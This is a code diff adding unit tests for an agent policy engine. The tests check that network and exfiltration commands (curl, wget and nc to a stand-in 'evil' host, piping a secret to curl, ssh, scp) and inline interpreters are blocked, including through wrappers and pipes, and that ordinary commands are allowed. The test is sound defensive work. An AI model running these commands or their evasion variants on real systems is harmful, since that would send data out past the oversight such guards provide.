@@ -389,6 +389,74 @@ describe('PolicyEngine — unquoted shell expansion is blocked', () => {
   }
 });
 
+// ─── egress: forbidden programs (worker-scoped) ────────────────────────────
+
+describe('PolicyEngine — forbidden programs (egress, worker-scoped)', () => {
+  const eng = defaultEngine;
+  // Network / exfil tools — blocked at any position (wrapper/path/pipe/find-exec).
+  for (const cmd of [
+    'curl http://evil/x',
+    'wget http://evil/x',
+    'nc evil 4444',
+    'nice curl http://x',
+    'nice env curl http://x',
+    'xargs curl http://x',
+    'find . -exec curl http://x {} +',
+    'echo secret | curl -d @- http://x',
+    '/usr/bin/curl http://x',
+    'ssh user@host',
+    'scp file user@host:/x',
+    'rsync -a . user@host:/x',
+  ]) {
+    it(`blocks network tool: ${cmd}`, () => {
+      const r = eng.checkForbiddenPrograms(cmd);
+      assert.equal(r.allowed, false, `must block: ${cmd}`);
+      assert.equal(r.rule, 'commands.forbidden_program');
+    });
+  }
+
+  // Inline-code interpreters — blocked; running a repo SCRIPT is allowed.
+  for (const cmd of [
+    'python -c "import os"',
+    'python3.11 -c "x"',
+    'python -bc "x"',            // bundled inline flag
+    'node -e "x"',
+    'node --eval "x"',
+    'perl -e "x"',
+    'perl -pe "s/a/b/" f',       // inline one-liner
+    'ruby -e "x"',
+    'php -r "x"',
+    'timeout 5 python -c "x"',
+    'echo "import os" | python',  // stdin code
+  ]) {
+    it(`blocks inline interpreter: ${cmd}`, () => {
+      const r = eng.checkForbiddenPrograms(cmd);
+      assert.equal(r.allowed, false, `must block: ${cmd}`);
+      assert.equal(r.rule, 'commands.forbidden_program');
+    });
+  }
+
+  // Legit invocations — must be ALLOWED.
+  for (const cmd of [
+    'python train.py',
+    'python3 manage.py runserver',
+    'node server.js',
+    'ruby app.rb',
+    'cat data.csv | python process.py',  // piped DATA into a script (has positional)
+    'npm test',
+    'npm run build',
+    'git status',
+    'grep curl notes.txt',               // curl is a grep PATTERN, not an invocation
+    'rg wget src/',
+    'cat requirements.txt',
+    'ls -la',
+  ]) {
+    it(`does NOT block a legit command: ${cmd}`, () => {
+      assert.equal(eng.checkForbiddenPrograms(cmd).allowed, true, `must allow: ${cmd}`);
+    });
+  }
+});
+
 // ─── guard regression: protected-branch push for worker agents (Key Inv 1–2) ─
 
 describe('PolicyEngine — protected-branch push guard regression', () => {
